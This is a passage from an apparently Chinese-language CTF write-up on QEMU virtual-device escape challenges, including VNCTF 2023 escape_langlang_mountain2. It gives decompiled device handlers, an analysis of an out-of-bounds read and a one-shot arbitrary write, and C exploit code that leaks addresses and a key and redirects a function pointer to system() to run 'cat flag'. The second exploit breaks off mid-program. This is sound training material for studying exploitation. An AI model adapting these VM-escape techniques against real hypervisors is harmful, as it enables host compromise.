class="line">00000B40 fun dq ?                                ; offset</span><br><span class="line">00000B48 DencState ends</span><br></pre></td></tr></table></figure><p>由于<code>denc_pmio_write</code>在写入数据时要将数据和<code>key</code>进行异或加密，但<code>key</code>可以让我们通过<code>denc_mmio_write</code>函数和<code>denc_mmio_read</code>相互配合来达到泄露<br>由于笔者的<code>C</code>语言学的像狗屎一样，所以这一道题在类型转换上面花了很多时间，而题目则是看了就瞬间有完整的攻击思路了</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* mmio_mem;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> offset, <span class="type">uint32_t</span> value)</span> &#123;</span><br><span class="line">    *((<span class="type">uint32_t</span> *) mmio_mem + offset) = value;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span> *) mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> pmio_mem = <span class="number">0x000000000000c000</span>;  </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> offset, <span class="type">uint32_t</span> value)</span> &#123;</span><br><span class="line">    outl(value, pmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> inl(pmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> cmd[<span class="number">0x20</span>] = <span class="string">&quot;cat flag;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;iopl(3)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FILE *pmio_fd = fopen(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!pmio_fd)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;pmio_fd&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;leak the elf base...&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> leak = mmio_read(<span class="number">8</span>) + (((<span class="type">size_t</span>)mmio_read(<span class="number">9</span>)) &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    <span class="type">size_t</span> elf_base = leak - <span class="number">3841704</span>;</span><br><span class="line">    <span class="type">size_t</span> system = elf_base + <span class="number">0x2CCB60</span>;</span><br><span class="line">    hexx(<span class="string">&quot;elf_base&quot;</span>, elf_base);</span><br><span class="line">    hexx(<span class="string">&quot;system@plt&quot;</span>, system);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;leak the key...&quot;</span>);</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">        mmio_write(i, <span class="number">0</span>);</span><br><span class="line">        key[i] = mmio_read(i);</span><br><span class="line">    &#125;</span><br><span class="line">    binary_dump(<span class="string">&quot;key&quot;</span>, key, <span class="keyword">sizeof</span>(key));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change the buf to cat flag...&quot;</span>);</span><br><span class="line">    mmio_write(<span class="number">0</span>, (*(<span class="type">uint32_t</span> *) &amp;cmd[<span class="number">0</span>]) ^ key[<span class="number">0</span>]);</span><br><span class="line">    mmio_write(<span class="number">1</span>, (*(<span class="type">uint32_t</span> *) &amp;cmd[<span class="number">4</span>]) ^ key[<span class="number">1</span>]);</span><br><span class="line">    mmio_write(<span class="number">2</span>, (*(<span class="type">uint32_t</span> *) &amp;cmd[<span class="number">8</span>]) ^ key[<span class="number">2</span>]);</span><br><span class="line">    info(<span class="string">&quot;change buf success&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change the fun...&quot;</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>, (system &amp; <span class="number">0xFFFFFFFF</span>) ^ key[<span class="number">8</span>]);</span><br><span class="line">    mmio_write(<span class="number">9</span>, ((system &gt;&gt; <span class="number">32</span>)&amp;<span class="number">0xffffffff</span>) ^ key[<span class="number">9</span>]);</span><br><span class="line">    info(<span class="string">&quot;change the fun success&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">0x660</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="VNCTF-2023-escape-langlang-mountain2"><a href="#VNCTF-2023-escape-langlang-mountain2" class="headerlink" title="[VNCTF 2023] escape_langlang_mountain2"></a>[VNCTF 2023] escape_langlang_mountain2</h2><h3 id="关键代码-1"><a href="#关键代码-1" class="headerlink" title="关键代码"></a>关键代码</h3><h4 id="vn-mmio-read"><a href="#vn-mmio-read" class="headerlink" title="vn_mmio_read"></a>vn_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vn_mmio_read</span><span class="params">(__int64 a1, __int64 addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 opaque; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  opaque = object_dynamic_cast_assert(a1, <span class="string">&quot;vn&quot;</span>, <span class="string">&quot;../qemu-8.1.4/hw/misc/vnctf.c&quot;</span>, <span class="number">21LL</span>, <span class="string">&quot;vn_mmio_read&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)(opaque + <span class="number">0xB80</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)(*(<span class="type">int</span> *)(opaque + <span class="number">0xB80</span>) + <span class="number">0xB40</span>LL + opaque);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="vn-mmio-write"><a href="#vn-mmio-write" class="headerlink" title="vn_mmio_write"></a>vn_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">vn_mmio_write</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> __int64 val)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 opaque; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  opaque = object_dynamic_cast_assert(a1, <span class="string">&quot;vn&quot;</span>, <span class="string">&quot;../qemu-8.1.4/hw/misc/vnctf.c&quot;</span>, <span class="number">42LL</span>, <span class="string">&quot;vn_mmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(opaque + <span class="number">0xB84</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(opaque + *(<span class="type">int</span> *)(opaque + <span class="number">0xB80</span>) + <span class="number">0xB40</span>LL) = val;<span class="comment">// 任意地址写</span></span><br><span class="line">      *(_DWORD *)(opaque + <span class="number">0xB84</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &lt;= <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)val &lt;= <span class="number">0x3C</span> )</span><br><span class="line">        *(_DWORD *)(opaque + <span class="number">0xB80</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x20</span> &amp;&amp; HIDWORD(val) &lt;= <span class="number">0x3C</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(opaque + HIDWORD(val) + <span class="number">0xB40</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在<code>vn_mmio_write</code>函数中，当<code>addr == 0x10</code>时存在数组溢出，从而能够让我们能够实现数组越界读。我们将<code>val</code>设置为为负数，读取<code>const MemoryRegionOps *ops</code>；来泄露出<code>qemu</code>地址，读取<code>void *opaque</code>;来泄露出堆地址。我们可以看到在<code>vn_mmio_write</code>函数中，当<code>addr ==0x30</code>时，我们有一次任意地址写的机会。于是我们的思路为，通过<code>main_loop_tlg</code>来泄露出<code>QEMUTimerList</code>的地址，然后修改<code>QEMUTimerList</code>中的<code>active_timers</code>指针指向我们我们伪造的<code>QEMTTimer</code>即可实现程序流的劫持</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">size_t</span> offset, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *) (mmio_mem + offset) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">size_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span> *) (mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">read_val</span><span class="params">(<span class="type">int</span> offset)</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, offset + <span class="number">4</span>);</span><br><span class="line">    <span class="type">size_t</span> a = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, offset);</span><br><span class="line">    <span class="keyword">return</span> (a &lt;&lt; <span class="number">32</span>) + (<span class="type">size_t</span>)mmio_read(<span class="number">0x20</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_val</span><span class="params">(<span class="type">uint64_t</span> offset, <span class="type">size_t</span> val)</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, (offset &lt;&lt; <span class="number">32</span>) + (val &amp; <span class="number">0xffffffff</span>));</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, ((offset + <span class="number">4</span>) &lt;&lt; <span class="number">32</span>) + (val &gt;&gt; <span class="number">32</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> 